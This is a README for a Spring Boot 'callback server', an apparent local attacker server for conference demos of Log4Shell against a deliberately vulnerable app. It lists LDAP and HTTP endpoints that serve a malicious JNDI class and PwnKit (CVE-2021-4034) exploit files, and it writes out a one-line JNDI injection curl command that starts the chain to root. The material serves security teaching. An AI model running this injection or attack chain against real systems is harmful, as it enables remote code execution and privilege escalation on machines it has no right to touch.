# 🎯 Callback Server

A Spring Boot application that acts as a local "attacker server" for security demos.
It provides:
- **HTTP callback catcher** — logs all incoming requests (proves JNDI/SSRF callbacks)
- **LDAP exploit server** (port 1389) — serves JNDI references for Log4Shell RCE
- **Exploit payload hosting** — serves malicious `.class` files and shell scripts
- **Live dashboard** — auto-refreshing HTML page for conference projectors

## Run

```bash
cd "Callback Server"
../mvnw spring-boot:run
```

Or with Docker Compose (from the Vulnerable Application directory):

```bash
cd "Vulnerable Application"
docker compose up callback
```

## Ports

| Port | Service |
|------|---------|
| 9999 | HTTP (callbacks, dashboard, exploit payloads) |
| 1389 | LDAP (malicious JNDI references for Log4Shell) |

## Endpoints

| URL | Purpose |
|-----|---------|
| `http://localhost:9999/dashboard/live` | Live HTML dashboard (auto-refreshes) |
| `http://localhost:9999/dashboard` | JSON API — all received callbacks |
| `DELETE http://localhost:9999/dashboard` | Clear callback history |
| `http://localhost:9999/exploit/ExploitPayload.class` | Malicious class loaded via JNDI |
| `http://localhost:9999/exploits/pwnkit.c` | PwnKit exploit source (CVE-2021-4034) |
| `http://localhost:9999/exploits/pwnkit.sh` | PwnKit auto-exploit shell script |
| `ldap://localhost:1389/pwnkit` | LDAP reference → triggers class loading |

## Full Attack Chain

```bash
# ONE curl command triggers the entire chain:
curl "http://victim:8081/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"

# What happens:
# 1. Log4j does JNDI lookup → connects to LDAP server (port 1389)
# 2. LDAP server responds with reference to ExploitPayload.class
# 3. Victim downloads class from HTTP server (port 9999)
# 4. Class executes: downloads pwnkit.c, compiles, runs → root
```

## Conference Presentation

1. Start the callback server (Docker Compose or standalone)
2. Open `http://localhost:9999/dashboard/live` on the projector
3. Run the exploit curl command — audience sees the full chain unfold in real-time
